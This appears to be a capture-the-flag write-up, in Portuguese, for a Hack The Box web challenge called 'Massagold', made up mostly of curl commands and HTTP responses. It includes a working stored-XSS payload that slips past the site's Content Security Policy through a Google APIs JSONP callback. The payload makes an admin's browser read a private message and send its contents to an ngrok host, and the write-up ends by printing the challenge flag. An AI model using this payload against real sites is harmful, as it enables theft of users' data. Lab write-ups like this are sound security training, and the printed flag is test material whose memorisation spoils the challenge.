# Massagold

## Resolvido por Cesar B. 

```bash
export URL='http://154.57.164.78:30919' && export PASS='T0x1nSenha123!' && export USER="t0x1n$(date +%s)"         
```                                                           


Comando
```bash
curl -i -sS \
  -c cookies.txt \
  -X POST "$URL/register" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS"
```

Resposta
```js
HTTP/1.1 302 Found
Server: nginx/1.26.3
Date: Fri, 24 Jul 2026 18:52:08 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 23
Connection: keep-alive
X-Powered-By: Express
Content-Security-Policy: default-src 'self'; script-src 'self' https://www.googleapis.com; style-src 'self'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; object-src 'none'; form-action 'self'; frame-ancestors 'none'
Location: /
Vary: Accept
Set-Cookie: connect.sid=s%3AAWa79ADrWjzoou3U3jRCWb5N57t4FiI_.xACauASdtjZAPOc5nDbiSXajEN3Hnm7Emvl3tvJ5Thk; Path=/; HttpOnly
``` 

                                                                                                                                                           
Comando
```bash
curl -i -sS \
  -c cookies.txt \
  -b cookies.txt \
  -X POST "$URL/login" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS"
``` 


Resposta
```js
HTTP/1.1 302 Found
Server: nginx/1.26.3
Date: Fri, 24 Jul 2026 18:52:15 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 23
Connection: keep-alive
X-Powered-By: Express
Content-Security-Policy: default-src 'self'; script-src 'self' https://www.googleapis.com; style-src 'self'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; object-src 'none'; form-action 'self'; frame-ancestors 'none'
Location: /
Vary: Accept
``` 

Comando
```bash
curl -i -sS \
  -b cookies.txt \
  "$URL/messages/new"
``` 


```js
HTTP/1.1 200 OK
Server: nginx/1.26.3
Date: Fri, 24 Jul 2026 18:52:20 GMT
<!doctype html>
<html lang="en">
...
...
...
``` 

Comando                                                                                                                                                             
```py
python3 - <<'PY' > payload.html
from urllib.parse import quote

js = """fetch('/messages/1').then(function(r){return r.text()}).then(function(t){var a=t.indexOf('HTB{');var b=t.indexOf('}',a);if(a!=-1&&b!=-1){location='http://0.tcp.sa.ngrok.io:29466/?flag='+encodeURIComponent(t.slice(a,b+1))}});"""

src = (
    "https://www.googleapis.com/books/v1/volumes"
    "?q=x&callback=" + quote(js, safe="")
)

print('<script src="' + src + '"></script>')
PY
``` 

Comando                                                                                                                                                             
```bash
SRC="$(grep -oP 'src="\K[^"]+' payload.html)"
``` 

Comando
```js
node --check /tmp/google.js
```                                                                                                                                                              

Comando
```bash
curl -i -sS \
  -b cookies.txt \
  -X POST "$URL/messages" \
  --data-urlencode 'to_username=admin' \
  --data-urlencode 'content@payload.html'
``` 

Resposta
```bash
HTTP/1.1 302 Found
```

<img width="1654" height="915" alt="image" src="https://github.com/user-attachments/assets/b99ae701-b9d6-422d-9a20-2f57b917bc8b" />



Flag Url encoded

```elixir
HTB%7Bm3554g3_1n_7h3_cu570dy_ch41n_b4b864305e9f6f95abb265bbc955b3bf%7D 
```

Flag Url decoded

```elixir
HTB{m3554g3_1n_7h3_cu570dy_ch41n_b4b864305e9f6f95abb265bbc955b3bf}
```
